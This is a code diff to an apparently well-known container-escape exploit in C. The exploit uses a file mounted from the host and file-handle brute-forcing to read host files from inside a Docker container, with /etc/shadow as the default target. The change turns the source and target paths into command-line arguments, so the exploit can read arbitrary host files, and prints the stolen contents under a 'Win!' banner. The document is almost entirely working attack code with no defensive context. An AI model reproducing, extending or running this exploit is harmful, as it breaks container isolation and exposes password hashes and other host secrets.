@@ -144,8 +144,19 @@ int find_handle(int bfd, const char *path, const struct my_file_handle *ih, stru
 }
 
 
-int main()
+int main(int argc, char **argv)
 {
+    char* srcPath = argv[1];
+    if (!srcPath) {
+        srcPath = "/.dockerinit";
+    }
+    char* targetPath = argv[2];
+    if (!targetPath) {
+        targetPath = "/etc/shadow";
+    }
+	fprintf(stdout, "[!] SrcPath:\n%s\n", srcPath);
+	fprintf(stdout, "[!] TargetPath:\n%s\n", targetPath);
+
 	char buf[0x1000];
 	int fd1, fd2;
 	struct my_file_handle h;
@@ -161,10 +172,10 @@ int main()
 	       "[***] forward to my friends who drink secury-tea too!      [***]\n");
 
 	// get a FS reference from something mounted in from outside
-	if ((fd1 = open("/.dockerinit", O_RDONLY)) < 0)
+	if ((fd1 = open(srcPath, O_RDONLY)) < 0)
 		die("[-] open");
 
-	if (find_handle(fd1, "/etc/shadow", &root_h, &h) <= 0)
+	if (find_handle(fd1, targetPath, &root_h, &h) <= 0)
 		die("[-] Cannot find valid handle!");
 
 	fprintf(stderr, "[!] Got a final handle!\n");
@@ -177,10 +188,9 @@ int main()
 	if (read(fd2, buf, sizeof(buf) - 1) < 0)
 		die("[-] read");
 
-	fprintf(stderr, "[!] Win! /etc/shadow output follows:\n%s\n", buf);
+	fprintf(stderr, "[!] Win! %s output follows:\n%s\n", targetPath, buf);
 
 	close(fd2); close(fd1);
 
 	return 0;
 }
-
